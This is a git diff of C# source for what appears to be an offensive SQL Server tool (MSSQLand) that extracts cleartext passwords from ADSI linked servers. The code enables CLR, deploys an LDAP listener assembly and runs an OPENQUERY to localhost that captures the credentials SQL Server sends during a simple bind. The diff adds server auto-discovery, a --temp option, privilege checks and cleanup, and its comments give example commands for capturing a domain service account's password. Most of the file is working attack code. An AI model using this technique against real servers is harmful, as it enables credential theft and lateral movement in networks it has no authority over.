@@ -1,4 +1,4 @@
-﻿// MSSQLand/Actions/Remote/AdsiCredentialExtractor.cs
+// MSSQLand/Actions/Remote/AdsiCredentialExtractor.cs
 
 using MSSQLand.Services;
 using MSSQLand.Utilities;
@@ -6,29 +6,40 @@ using System;
 using System.Data;
 using System.Threading.Tasks;
 
-namespace MSSQLand.Actions.Remote
+namespace MSSQLand.Actions.Domain
 {
     /// <summary>
-    /// Extracts credentials from ADSI linked servers using LDAP simple bind interception.
+    /// Captures cleartext credentials via LDAP simple bind interception against an ADSI linked server.
+    /// Requires CONTROL SERVER or sysadmin (CLR deployment). For unprivileged capture, use adsi-redirect.
     ///
-    /// Technique: Creates a fake LDAP server via CLR, then triggers an LDAP query through
-    /// the ADSI provider. SQL Server sends credentials in cleartext during LDAP simple bind.
+    /// How it works:
+    ///   Deploys a CLR assembly that starts a local LDAP listener, then redirects an ADSI OPENQUERY
+    ///   to localhost. SQL Server performs an LDAP simple bind � sending credentials in cleartext.
     ///
-    /// Use Cases:
-    /// 1. Extract linked login password from existing ADSI server with mapped credentials
-    /// 2. Extract SQL login password when executing through a linked server chain
-    ///    (the linked server's configured login password, not your own)
+    /// Scenario A � Existing ADSI server with explicit linked login (e.g. PGD\svc-ldap):
+    ///   The bind uses the configured linked login, not your own credentials.
+    ///   Captured password belongs to that domain account.
+    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." adsi-creds
     ///
-    /// Limitations:
-    /// - Windows/Kerberos auth uses GSSAPI (encrypted) - no cleartext password
-    /// - Direct SQL auth connection returns your own password (pointless)
+    /// Scenario B � Existing ADSI server with useself=TRUE (no linked login):
+    ///   The bind uses the current SQL context's password.
+    ///   Only interesting when you landed via a linked server as an unknown SQL login (e.g. sa).
+    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." -l SQL02 adsi-creds
+    ///
+    /// Scenario C � No existing ADSI server, opt-in temporary server (--temp):
+    ///   Creates a useself=TRUE server, captures the current SQL context's password, then drops it.
+    ///   Same value as B but without a pre-existing ADSI server. Noisier (creates sys.servers entry).
+    ///   dotnet MSSQLand.exe SQL01 -c local -u analyst -p "..." -l SQL02 adsi-creds --temp
     ///
     /// Reference: https://www.tarlogic.com/blog/linked-servers-adsi-passwords
     /// </summary>
     internal class AdsiCredentialExtractor : BaseAction
     {
-        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (creates temporary server if omitted)")]
+        [ArgumentMetadata(Position = 0, Description = "Target ADSI server name (auto-discovers if omitted)")]
         private string _targetServer = "";
+
+        [ArgumentMetadata(ShortName = "t", LongName = "temp", Description = "Create a temporary useself=TRUE ADSI server to capture the current SQL context's password. Requires CONTROL SERVER. Only useful when landing as an unknown SQL login via a linked server chain.")]
+        private bool _useTemporaryServer = false;
 
         [ExcludeFromArguments]
         private bool _useExistingServer = false;
@@ -39,7 +50,7 @@ namespace MSSQLand.Actions.Remote
 
             if (args != null && args.Length > 1)
             {
-                throw new ArgumentException("Only a single ADSI server name may be provided.");
+                throw new ArgumentException("Usage: adsi-creds [adsi-server] [--temp]");
             }
 
             _useExistingServer = !string.IsNullOrWhiteSpace(_targetServer);
@@ -54,37 +65,37 @@ namespace MSSQLand.Actions.Remote
             string authType = databaseContext.AuthService.CredentialsType;
             bool isExecutingThroughLinks = !databaseContext.QueryService.LinkedServers.IsEmpty;
 
-            // Check if this is a pointless scenario: direct SQL auth connection without links
-            if (!_useExistingServer && !isExecutingThroughLinks)
-            {
-                if (authType == "sql" || authType == "local")
-                {
-                    Logger.Warning("Pointless operation: You're directly connected with SQL auth.");
-                    Logger.WarningNested("You already know your own password");
-                    return null;
-                }
-                else if (authType == "windows" || authType == "token" || authType == "entraid")
-                {
-                    Logger.Warning("Windows/Token/EntraID authentication uses GSSAPI (no cleartext password).");
-                    Logger.WarningNested("This technique only works with SQL authentication.");
-                    return null;
-                }
-            }
-
-            // If executing through links, inform user what we're extracting
-            if (isExecutingThroughLinks && !_useExistingServer)
-            {
-                Logger.Info("Executing through linked server chain - will extract the link's SQL login password");
-            }
-
             if (_useExistingServer)
             {
                 return ExtractFromExistingServer(databaseContext);
             }
-            else
+
+            // Discover existing ADSI servers on the execution target first.
+            // An existing server may have an explicit linked login (capturing someone else's
+            // credentials), so we must not reject based on auth type before checking.
+            AdsiService discovery = new(databaseContext);
+            var existingServers = discovery.GetAdsiServerNames();
+            if (existingServers.Count > 0)
             {
-                return ExtractWithTemporaryServer(databaseContext);
+                _targetServer = existingServers[0];
+                Logger.Info($"Found existing ADSI linked server: '{_targetServer}'");
+                _useExistingServer = true;
+                return ExtractFromExistingServer(databaseContext);
             }
+
+            if (!_useTemporaryServer)
+            {
+                Logger.Warning("No existing ADSI linked server found.");
+                Logger.WarningNested("Use --temp to create a temporary server and capture the current SQL context's password");
+                Logger.WarningNested("Use adsi-redirect <listener> if you lack CONTROL SERVER");
+                return null;
+            }
+
+            // --temp path: no existing server, user explicitly opted in.
+            // A temporary useself=TRUE server captures the current SQL context's password.
+            // Only meaningful when landing as an unknown SQL login via a linked server chain.
+
+            return ExtractWithTemporaryServer(databaseContext);
         }
 
         /// <summary>
@@ -164,6 +175,17 @@ namespace MSSQLand.Actions.Remote
 
             Logger.Task($"Extracting credentials via LDAP simple bind interception");
 
+            Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");
+
+            // CLR deployment requires CONTROL SERVER or sysadmin.
+            // For unprivileged capture via an external listener, use adsi-redirect instead.
+            if (!databaseContext.UserService.IsAdmin() && !databaseContext.UserService.HasPermission("CONTROL SERVER"))
+            {
+                Logger.Error("CLR deployment requires sysadmin or CONTROL SERVER.");
+                Logger.ErrorNested("To capture credentials without privileges, use: adsi-redirect <listener> [adsi-server]");
+                return null;
+            }
+
             if (databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1) == false)
             {
                 Logger.Error("Failed to enable CLR. Aborting execution.");
@@ -172,23 +194,25 @@ namespace MSSQLand.Actions.Remote
 
             adsiService.Port = Misc.GetRandomUnusedPort();
 
-            Logger.TaskNested($"Targeting linked ADSI server: {adsiServer}");
-
             try
             {
                 adsiService.LoadLdapServerAssembly();
-
                 Task<DataTable> task = adsiService.ListenForRequest();
 
                 Logger.TaskNested("Executing LDAP solicitation");
 
-                string[] impersonateTargets = databaseContext.QueryService.ExecutionServer.ImpersonationUsers;
-
-                if (impersonateTargets != null && impersonateTargets.Length > 0)
+                // For a temporary server using @useself='true', impersonated users won't have
+                // a login mapping on the newly created server � bail out early.
+                // Existing servers have their own configured login, so impersonation doesn't matter.
+                if (!_useExistingServer)
                 {
-                    Logger.Warning("Cannot retrieve impersonated user credentials. Not mapped to temporary ADSI server");
-                    Logger.WarningNested("The impersonated context uses the original user's authentication method");
-                    return null;
+                    string[] impersonateTargets = databaseContext.QueryService.ExecutionServer.ImpersonationUsers;
+                    if (impersonateTargets != null && impersonateTargets.Length > 0)
+                    {
+                        Logger.Warning("Cannot retrieve impersonated user credentials. Not mapped to temporary ADSI server");
+                        Logger.WarningNested("The impersonated context uses the original user's authentication method");
+                        return null;
+                    }
                 }
 
                 string exploitQuery = $"SELECT * FROM OPENQUERY([{adsiServer}], 'SELECT * FROM ''LDAP://localhost:{adsiService.Port}'' ')";
@@ -246,6 +270,13 @@ namespace MSSQLand.Actions.Remote
             {
                 Logger.Error($"ADSI credential extraction failed: {ex.Message}");
                 return null;
+            }
+            finally
+            {
+                Logger.Info("Cleaning up CLR assembly and function");
+                try { databaseContext.ConfigService.DropDependentObjects(adsiService.AssemblyName); } catch { }
+                try { databaseContext.QueryService.ExecuteNonProcessing($"DROP FUNCTION IF EXISTS [{adsiService.FunctionName}];"); } catch { }
+                try { databaseContext.QueryService.ExecuteNonProcessing($"DROP ASSEMBLY IF EXISTS [{adsiService.AssemblyName}];"); } catch { }
             }
         }
     }
